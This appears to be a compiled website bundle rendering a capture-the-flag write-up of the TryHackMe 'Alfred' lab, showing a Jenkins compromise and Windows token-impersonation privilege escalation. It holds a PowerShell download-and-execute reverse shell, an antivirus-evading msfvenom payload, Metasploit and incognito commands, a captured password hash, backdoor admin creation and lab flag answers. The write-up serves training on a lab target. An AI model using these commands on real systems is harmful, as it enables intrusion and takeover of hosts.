"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[2915],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>m});var a=n(67294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},i=Object.keys(e);for(a=0;a<i.length;a++)n=i[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(a=0;a<i.length;a++)n=i[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var l=a.createContext({}),c=function(e){var t=a.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},p=function(e){var t=c(e.components);return a.createElement(l.Provider,{value:t},e.children)},d="mdxType",u={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},h=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,i=e.originalType,l=e.parentName,p=s(e,["components","mdxType","originalType","parentName"]),d=c(n),h=r,m=d["".concat(l,".").concat(h)]||d[h]||u[h]||i;return n?a.createElement(m,o(o({ref:t},p),{},{components:n})):a.createElement(m,o({ref:t},p))}));function m(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var i=n.length,o=new Array(i);o[0]=h;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s[d]="string"==typeof e?e:r,o[1]=s;for(var c=2;c<i;c++)o[c]=n[c];return a.createElement.apply(null,o)}return a.createElement.apply(null,n)}h.displayName="MDXCreateElement"},52396:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>o,default:()=>u,frontMatter:()=>i,metadata:()=>s,toc:()=>c});var a=n(87462),r=(n(67294),n(3905));const i={},o="Alfred",s={unversionedId:"Tryhackme/Alfred/Alfred",id:"Tryhackme/Alfred/Alfred",title:"Alfred",description:"Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.",source:"@site/writeups/Tryhackme/Alfred/Alfred.md",sourceDirName:"Tryhackme/Alfred",slug:"/Tryhackme/Alfred/",permalink:"/writeups/Tryhackme/Alfred/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Agent Sudo",permalink:"/writeups/Tryhackme/Agent Sudo/"},next:{title:"Anonforce",permalink:"/writeups/Tryhackme/Anonforce/"}},l={},c=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Initial Access",id:"task-1-initial-access",level:2},{value:"Task 2 Switching Shells",id:"task-2-switching-shells",level:2},{value:"Task 3 Privilege Escalation",id:"task-3-privilege-escalation",level:2}],p={toc:c},d="wrapper";function u(e){let{components:t,...i}=e;return(0,r.kt)(d,(0,a.Z)({},p,i,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"alfred"},"Alfred"),(0,r.kt)("p",null,"Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens."),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/alfred"},"Alfred")),(0,r.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,r.kt)("li",{parentName:"ul"},"Abusing Token Privileges For LPE")),(0,r.kt)("hr",null),(0,r.kt)("h2",{id:"task-1-initial-access"},"Task 1 Initial Access"),(0,r.kt)("p",null,"In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we'll use an interesting privilege escalation method to get full system access."),(0,r.kt)("p",null,"Since this is a Windows application, we'll be using ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/samratashok/nishang"},"Nishang")," to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we'll be using the ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1"},"reverse shell scripts")),(0,r.kt)("p",null,"Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up."),(0,r.kt)("p",null,"How many ports are open? (TCP only)"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Alfred$ sudo nmap -A -sS -sC -sV -O -Pn 10.10.176.61\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.\nStarting Nmap 7.91 ( https://nmap.org ) at 2020-11-18 21:16 CET\nNmap scan report for 10.10.176.61\nHost is up (0.053s latency).\nNot shown: 997 filtered ports\nPORT     STATE SERVICE    VERSION\n80/tcp   open  http       Microsoft IIS httpd 7.5\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/7.5\n|_http-title: Site doesn't have a title (text/html).\n3389/tcp open  tcpwrapped\n| ssl-cert: Subject: commonName=alfred\n| Not valid before: 2020-10-02T14:42:05\n|_Not valid after:  2021-04-03T14:42:05\n8080/tcp open  http       Jetty 9.4.z-SNAPSHOT\n| http-robots.txt: 1 disallowed entry\n|_/\n|_http-server-header: Jetty(9.4.z-SNAPSHOT)\n|_http-title: Site doesn't have a title (text/html;charset=utf-8).\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows 8.1 R1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 3389/tcp)\nHOP RTT      ADDRESS\n1   40.28 ms 10.8.0.1\n2   55.56 ms 10.10.176.61\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 1254.35 seconds\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"3")),(0,r.kt)("p",null,"What is the username and password for the log in panel(in the format username:password)"),(0,r.kt)("p",null,(0,r.kt)("img",{src:n(4215).Z,width:"331",height:"409"})),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"admin:admin")),(0,r.kt)("p",null,"Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it:\n",(0,r.kt)("inlineCode",{parentName:"p"},"powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port")),(0,r.kt)("p",null,"You first need to download the Powershell script, and make it available for the server to download. You can do this by creating a http server with python:\n",(0,r.kt)("inlineCode",{parentName:"p"},"python3 -m http.server")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://10.10.176.61:8080/job/project/configure"},"http://10.10.176.61:8080/job/project/configure")),(0,r.kt)("p",null,(0,r.kt)("img",{src:n(41732).Z,width:"1446",height:"511"})),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-ps1"},"powershell iex (New-Object Net.WebClient).DownloadString('http://10.8.106.222/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.8.106.222 -Port 9001\n")),(0,r.kt)("p",null,(0,r.kt)("img",{src:n(36212).Z,width:"1441",height:"512"})),(0,r.kt)("p",null,(0,r.kt)("img",{src:n(8629).Z,width:"352",height:"369"})),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,r.kt)("p",null,"What is the user.txt flag?"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Alfred$ nc -lnvp 9001\nListening on 0.0.0.0 9001\nConnection received on 10.10.176.61 49224\nWindows PowerShell running as user bruce on ALFRED\nCopyright (C) 2015 Microsoft Corporation. All rights reserved.\n\nPS C:\\Program Files (x86)\\Jenkins\\workspace\\project>whoami\nalfred\\bruce\nPS C:\\Program Files (x86)\\Jenkins\\workspace\\project> cd "C:\\Users\\bruce\\Desktop"\nPS C:\\Users\\bruce\\Desktop> dir\n\n\n    Directory: C:\\Users\\bruce\\Desktop\n\n\nMode                LastWriteTime     Length Name\n----                -------------     ------ ----\n-a---        10/25/2019  11:22 PM         32 user.txt\n\n\nPS C:\\Users\\bruce\\Desktop> type user.txt\n79007a09481963edf2e1321abd9ae2a0\n')),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"79007a09481963edf2e1321abd9ae2a0")),(0,r.kt)("h2",{id:"task-2-switching-shells"},"Task 2 Switching Shells"),(0,r.kt)("p",null,"To make the privilege escalation easier, let's switch to a meterpreter shell using the following process."),(0,r.kt)("p",null,"Use msfvenom to create the a windows meterpreter reverse shell using the following payload"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe")),(0,r.kt)("p",null,"This payload generates an encoded x86-64 reverse tcp meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly, and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious."),(0,r.kt)("p",null,"After creating this payload, download it to the machine using the same method in the previous step:"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"powershell \"(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')\"")),(0,r.kt)("p",null,"Before running this program, ensure the handler is set up in metasploit:"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run")),(0,r.kt)("p",null,"This step uses the metasploit handler to receive the incoming connection from you reverse shell. Once this is running, enter this command to start the reverse shell"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},'Start-Process "shell-name.exe"')),(0,r.kt)("p",null,"This should spawn a meterpreter shell for you!"),(0,r.kt)("p",null,"What is the final size of the exe payload that you generated?"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Alfred$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.106.222 LPORT=9002 -f exe -o win_revshell.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\nFound 1 compatible encoders\nAttempting to encode payload with 1 iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 368 (iteration=0)\nx86/shikata_ga_nai chosen with final size 368\nPayload size: 368 bytes\nFinal size of exe file: 73802 bytes\nSaved as: win_revshell.exe\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"73802")),(0,r.kt)("h2",{id:"task-3-privilege-escalation"},"Task 3 Privilege Escalation"),(0,r.kt)("p",null,"Now that we have initial access, let's use token impersonation to gain system access."),(0,r.kt)("p",null,"Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process)."),(0,r.kt)("p",null,"This access token consists of:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"user SIDs(security identifier)"),(0,r.kt)("li",{parentName:"ul"},"group SIDs"),(0,r.kt)("li",{parentName:"ul"},"privileges")),(0,r.kt)("p",null,"amongst other things. More detailed information can be found here."),(0,r.kt)("p",null,"There are two types of access tokens:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"primary access tokens: those associated with a user account that are generated on log on"),(0,r.kt)("li",{parentName:"ul"},"impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process")),(0,r.kt)("p",null,"For an impersonation token, there are different levels:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"SecurityAnonymous: current user/client cannot impersonate another user/client"),(0,r.kt)("li",{parentName:"ul"},"SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client"),(0,r.kt)("li",{parentName:"ul"},"SecurityImpersonation: current user/client can impersonate the client's security context on the local system"),(0,r.kt)("li",{parentName:"ul"},"SecurityDelegation: current user/client can impersonate the client's security context on a remote system")),(0,r.kt)("p",null,"where the security context is a data structure that contains users' relevant security information."),(0,r.kt)("p",null,"The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"SeImpersonatePrivilege"),(0,r.kt)("li",{parentName:"ul"},"SeAssignPrimaryPrivilege"),(0,r.kt)("li",{parentName:"ul"},"SeTcbPrivilege"),(0,r.kt)("li",{parentName:"ul"},"SeBackupPrivilege"),(0,r.kt)("li",{parentName:"ul"},"SeRestorePrivilege"),(0,r.kt)("li",{parentName:"ul"},"SeCreateTokenPrivilege"),(0,r.kt)("li",{parentName:"ul"},"SeLoadDriverPrivilege"),(0,r.kt)("li",{parentName:"ul"},"SeTakeOwnershipPrivilege"),(0,r.kt)("li",{parentName:"ul"},"SeDebugPrivilege")),(0,r.kt)("p",null,"There's more reading ",(0,r.kt)("a",{parentName:"p",href:"https://www.exploit-db.com/papers/42556"},"here"),"."),(0,r.kt)("p",null,"View all the privileges using whoami /priv"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"PS C:\\Users\\bruce\\Desktop> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                  Description                               State\n=============================== ========================================= ========\nSeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled\nSeSecurityPrivilege             Manage auditing and security log          Disabled\nSeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled\nSeLoadDriverPrivilege           Load and unload device drivers            Disabled\nSeSystemProfilePrivilege        Profile system performance                Disabled\nSeSystemtimePrivilege           Change the system time                    Disabled\nSeProfileSingleProcessPrivilege Profile single process                    Disabled\nSeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled\nSeCreatePagefilePrivilege       Create a pagefile                         Disabled\nSeBackupPrivilege               Back up files and directories             Disabled\nSeRestorePrivilege              Restore files and directories             Disabled\nSeShutdownPrivilege             Shut down the system                      Disabled\nSeDebugPrivilege                Debug programs                            Enabled\nSeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled\nSeChangeNotifyPrivilege         Bypass traverse checking                  Enabled\nSeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled\nSeUndockPrivilege               Remove computer from docking station      Disabled\nSeManageVolumePrivilege         Perform volume maintenance tasks          Disabled\nSeImpersonatePrivilege          Impersonate a client after authentication Enabled\nSeCreateGlobalPrivilege         Create global objects                     Enabled\nSeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled\nSeTimeZonePrivilege             Change the time zone                      Disabled\nSeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,r.kt)("p",null,"You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability. Enter: load incognito to load the incognito module in metasploit. Please note, you may need to use the use incognito command if the previous command doesn't work. Also ensure that your metasploit is up to date."),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,r.kt)("p",null,'To check which tokens are available, enter the list_tokens -g. We can see that the BUILTIN\\Administrators token is available. Use the impersonate_token "BUILTIN\\Administrators" command to impersonate the Administrators token. What is the output when you run the getuid command?'),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"NT AUTHORITY\\SYSTEM")),(0,r.kt)("p",null,"Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). Ensure that you migrate to a process with correct permissions (above questions answer). The safest process to pick is the services.exe process. First use the ps command to view processes and find the PID of the services.exe process. Migrate to this process using the command migrate PID-OF-PROCESS"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,r.kt)("p",null,"read the root.txt file at C:\\Windows\\System32\\config"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Alfred$ sudo smbserver.py smbfolder .\nImpacket v0.9.22.dev1+20201015.130615.81eec85a - Copyright 2020 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n[*] Incoming connection (10.10.176.61,49259)\n[*] AUTHENTICATE_MESSAGE (alfred\\bruce,ALFRED)\n[*] User ALFRED\\bruce authenticated successfully\n[*] bruce::alfred:aaaaaaaaaaaaaaaa:8cf02ea70c705df2b6411afcee008cfc:010100000000000000100128efbdd601fafa4637b85be99c000000000100100051006c005500530063005a004f0070000300100051006c005500530063005a004f007000020010004e006800670056005900520078006d00040010004e006800670056005900520078006d000700080000100128efbdd601060004000200000008003000300000000000000000000000003000008146bf154e488fc0cac7383dfee4c73eeca272c7f0291b32716524219b103f5b0a001000000000000000000000000000000000000900220063006900660073002f00310030002e0038002e003100300036002e00320032003200000000000000000000000000\n[-] Unknown level for query path info! 0x109\n[*] Disconnecting Share(1:IPC$)\n[*] Disconnecting Share(2:SMBFOLDER)\n[*] Closing down connection (10.10.176.61,49259)\n[*] Remaining connections []\n")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://labs.f-secure.com/archive/incognito-v2-0-released/"})),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Alfred$ nc -lnvp 9001\nListening on 0.0.0.0 9001\nConnection received on 10.10.176.61 49257\nWindows PowerShell running as user bruce on ALFRED\nCopyright (C) 2015 Microsoft Corporation. All rights reserved.\n\nPS C:\\Program Files (x86)\\Jenkins\\workspace\\project>cd C:\\windows\\temp\nPS C:\\windows\\temp> copy \\\\10.8.106.222\\smbfolder\\incognito2\\incognito.exe\nPS C:\\windows\\temp> dir\n\n\n    Directory: C:\\windows\\temp\n\n\nMode                LastWriteTime     Length Name\n----                -------------     ------ ----\nd----        10/25/2019   8:04 PM            hsperfdata_WIN-NPD8TIBHOIO$\nd----        10/25/2019   9:54 PM            jetty-0.0.0.0-8080-war-_-any-24795\n                                             42305151993622.dir\nd----        10/25/2019   9:55 PM            jna--652807375\n-a---        10/27/2019  12:25 AM       8838 Amazon_SSM_Agent_20191026162504.lo\n                                             g\n-a---        10/27/2019  12:25 AM     180060 Amazon_SSM_Agent_20191026162504_00\n                                             0_AmazonSSMAgentMSI.log\n-a---        10/27/2019  12:25 AM       1207 cleanup.txt\n-a---        10/27/2019  12:25 AM        422 cmdout\n-a---        10/27/2019  12:21 AM       1005 dd_dotnetfx45_decompression_log.tx\n                                             t\n-a---        10/25/2019   9:47 PM          0 DMI687E.tmp\n-a---        10/27/2019  12:25 AM       8786 EC2ConfigService_20191026162425.lo\n                                             g\n-a---        10/27/2019  12:25 AM     262728 EC2ConfigService_20191026162425_00\n                                             0_WiXEC2ConfigSetup_64.log\n-a---        10/27/2019  12:25 AM          0 FXSAPIDebugLogFile.txt\n-a---        10/27/2019  12:25 AM          0 FXSTIFFDebugLogFile.txt\n-a---         7/18/2012   1:12 PM     102912 incognito.exe\n-a---        10/27/2019  12:21 AM    1140366 Microsoft .NET Framework 4.5.1 Set\n                                             up_20191026_162047619.html\n-a---        10/26/2019  12:17 PM       1816 MpCmdRun.log\n-a---        10/27/2019  12:25 AM         21 stage1-complete.txt\n-a---        10/27/2019  12:25 AM      34037 stage1.txt\n-a---        10/16/2019   7:26 AM     113328 svcexec.exe\n-a---        10/27/2019  12:25 AM         67 tmp.dat\n-a---        10/25/2019   9:47 PM     262144 TS_C43B.tmp\n-a---        10/25/2019   9:47 PM     262144 TS_C584.tmp\n-a---        10/25/2019   9:47 PM     458752 TS_C602.tmp\n-a---        10/25/2019   9:47 PM     196608 TS_C75B.tmp\n-a---        10/25/2019   9:47 PM     196608 TS_C8A4.tmp\n-a---        10/25/2019   9:47 PM     196608 TS_C941.tmp\n-a---        10/25/2019   9:47 PM     720896 TS_C9BF.tmp\n-a---        10/25/2019   9:47 PM     458752 TS_CD89.tmp\n-a---        10/25/2019   9:47 PM     262144 TS_CE84.tmp\n-a---        10/25/2019   9:54 PM    2390099 winstone2061818542446950210.jar\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"PS C:\\windows\\temp> ./incognito.exe add_user stroke hello123!\n[-] WARNING: Not running as SYSTEM. Not all tokens will be available.\n[*] Enumerating tokens\n[*] Attempting to add user stroke to host 127.0.0.1\n[+] Successfully added user\nPS C:\\windows\\temp> ./incognito.exe add_localgroup_user Administrators stroke\n[-] WARNING: Not running as SYSTEM. Not all tokens will be available.\n[*] Enumerating tokens\n[*] Attempting to add user stroke to local group Administrators on host 127.0.0.1\n[+] Successfully added user to local group\nPS C:\\windows\\temp>\n")),(0,r.kt)("p",null,(0,r.kt)("img",{src:n(46989).Z,width:"646",height:"482"})),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"dff0f748678f280250f25a45b8046b4a")))}u.isMDXComponent=!0},4215:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/2020-11-18_21-38-557b67ef91a9b77505d418eb3bd03030.png"},41732:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/2020-11-18_21-41-5f16d85e1ab7ee5b698dfc2ed94f761a.png"},36212:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/2020-11-18_21-45-703513876d72b5229a2733af8143f63d.png"},8629:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/2020-11-18_21-46-33b849eded5aaf4e7de0bb999599a920.png"},46989:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/2020-11-18_22-19-33f0a81b1418ea5040a9b27df8db630f.png"}}]);